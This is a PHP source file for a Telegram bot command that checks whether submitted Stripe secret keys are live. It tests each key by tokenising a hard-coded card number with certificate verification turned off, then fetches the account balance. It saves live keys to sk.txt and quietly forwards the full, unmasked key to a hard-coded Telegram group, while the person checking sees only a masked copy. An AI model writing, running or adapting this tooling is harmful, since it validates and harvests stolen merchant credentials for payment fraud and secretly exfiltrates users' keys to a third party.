<?php

/*

///==[Stripe SK Key Checker Commands]==///

/key sk_live - Checks the SK Key
/balance sk_live - Fetches the Balance for a Live SK Key

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if (strpos($message, "/sk") === 0 || strpos($message, ".sk ") === 0) {
$sec = substr($message, 4);
if (!empty($sec)) {
          $sechidden = substr_replace($sec, '',12).preg_replace("/(?!^).(?!$)/", "x", substr($sec, 12));
          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
          curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
          curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]=4912461004526326&card[exp_month]=04&card[exp_year]=2024&card[cvc]=011');
          $result = curl_exec($ch);
          $response = trim(strip_tags(GetStr($result,'"message": "','"')));
          if (strpos($result, 'tok_')){
            $balance = getBalance($sec);
               if ($balance !== false) {
                // Extract the balance details from the returned array
                $availableFormatted = $balance['available'];
                $pendingFormatted = $balance['pending'];
                $currency = $balance['currency']; // Extract the currency from the balance array
                $country = $balance['country'];   // Extract the country from the balance array           
                file_put_contents('sk.txt', "\n$sec",FILE_APPEND);    
               bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "<b>SK Key:</b> <code>$sechidden</code>\n
<b>Response: Sk is Live ✅</b>\n
<b>Balance:</b> $availableFormatted\n
<b>Pending:</b> $pendingFormatted\n
<b>Currency:</b> $currency\n
<b>Country:</b> $country\n
Checked By <a href='tg://user?id=$userId'>$firstname</a>\n
                    Bot By: <a href='t.me/av7271'>av7271</a>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'
                ]);
                
            bot1('sendMessage', [
                    'chat_id' => "-1001527229740",
                    'text' => "<b>SK Key:</b> <code>$sec</code>\n
<b>Response: Sk is Live ✅</b>\n
<b>Balance:</b> $availableFormatted\n
<b>Pending:</b> $pendingFormatted\n
<b>Currency:</b> $currency\n
<b>Country:</b> $country\n
Checked By <a href='tg://user?id=$userId'>$firstname</a>\n
Bot By: <a href='t.me/av7271'>av7271</a>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'
                ]);
                
          }}
          elseif (strpos($result, 'Invalid API Key provided')){
            bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "<b>SK Key:</b> <code>$sec</code>\n
<b>Response: Invalid Sk provided❌ </b>\n
Checked By <a href='tg://user?id=$userId'>$firstname</a>\n
Bot By: <a href='t.me/av7271'>av7271</a>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'
                ]);
          }
          elseif (strpos($result, 'You did not provide an API key.')){
          bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "<b>SK Key:</b> <code>$sec</code>\n
<b>Response: Sk is Dead❌</b>\n
Checked By <a href='tg://user?id=$userId'>$firstname</a>\n
Bot By: <a href='t.me/av7271'>av7271</a>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'
                ]);
          }
          elseif (strpos($result, 'rate_limit')){
            $balance = getBalance($sec);
               if ($balance !== false) {
                // Extract the balance details from the returned array
                $availableFormatted = $balance['available'];
                $pendingFormatted = $balance['pending'];
                $currency = $balance['currency']; // Extract the currency from the balance array
                $country = $balance['country'];   // Extract the country from the balance 
                file_put_contents('sk.txt', "\n$sec",FILE_APPEND);        
            bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "<b>SK Key:</b> <code>$sechidden</code>\n
<b>Response: Sk is Rate limited⚠️ </b>\n
<b>Balance:</b> $availableFormatted\n
<b>Pending:</b> $pendingFormatted\n
<b>Currency:</b> $currency\n
<b>Country:</b> $country\n
Checked By <a href='tg://user?id=$userId'>$firstname</a>\n
                    Bot By: <a href='t.me/av7271'>av7271</a>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'
                ]);
            bot1('sendMessage', [
                    'chat_id' => "-1001527229740",
                    'text' => "<b>SK Key:</b> <code>$sec</code>\n
<b>Response: Sk is Rate limited⚠️ </b>\n
<b>Balance:</b> $availableFormatted\n
<b>Pending:</b> $pendingFormatted\n
<b>Currency:</b> $currency\n
<b>Country:</b> $country\n
Checked By <a href='tg://user?id=$userId'>$firstname</a>\n
Bot By: <a href='t.me/av7271'>av7271</a>",
                    'parse_mode' => 'html',
                    'disable_web_page_preview' => 'true'
                ]);
                 
          }}
          elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
          bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "<b>SK Key:</b> <code>$sec</code>\n
<b>Response: Sk is Test mode charge❌</b>\n                    
Checked By <a href='tg://user?id=$userId'>$firstname</a>\n
Bot By: <a href='t.me/av7271'>av7271</a>",
'parse_mode' => 'html',
'disable_web_page_preview' => 'true'
                ]);
          }
          elseif (strpos($result, 'api_key_expired')){
          bot('sendMessage', [
                    'chat_id' => $chat_id,
                    'text' => "<b>SK Key:</b> <code>$sec</code>\n
<b>Response: Sk is Expired❌</b>\n
Checked By <a href='tg://user?id=$userId'>$firstname</a>\n
Bot By: <a href='t.me/av7271'>av7271</a>",
'parse_mode' => 'html',
'disable_web_page_preview' => 'true'
                ]);
          }
          else{
          bot('sendMessage', [
                    'chat_id' => $chat_id,
'text' => "<b>SK Key:</b> <code>$sec</code>\n
<b>Response: Invalid sk provided❌</b>\n
Checked By <a href='tg://user?id=$userId'>$firstname</a>\n
Bot By: <a href='t.me/av7271'>av7271</a>",
'parse_mode' => 'html',
'disable_web_page_preview' => 'true'
                ]);
          }
          }
          else {
          sendMessage($chatId, '<b>❌ No Sk Provided
          Format - /sk sk_live_xxxxxxxxxxx</b>', $message_id);
          }
}